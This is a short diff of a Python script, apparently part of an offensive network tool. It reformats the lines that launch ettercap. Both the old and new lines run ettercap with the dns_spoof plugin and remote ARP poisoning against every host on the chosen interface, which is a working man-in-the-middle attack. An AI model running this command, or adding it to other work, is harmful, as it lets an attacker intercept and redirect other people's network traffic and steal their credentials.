@@ -87,7 +87,7 @@ time.sleep(1)
 
 if os.path.isfile('src/config.py'):
     from src.config import etterdir
-    subprocess.call([etterdir, '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///', ])
+    subprocess.call([etterdir, '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///',])
 else:
-    subprocess.call(['ettercap', '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///', ])
+    subprocess.call(['ettercap', '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///',])
 exit(1)
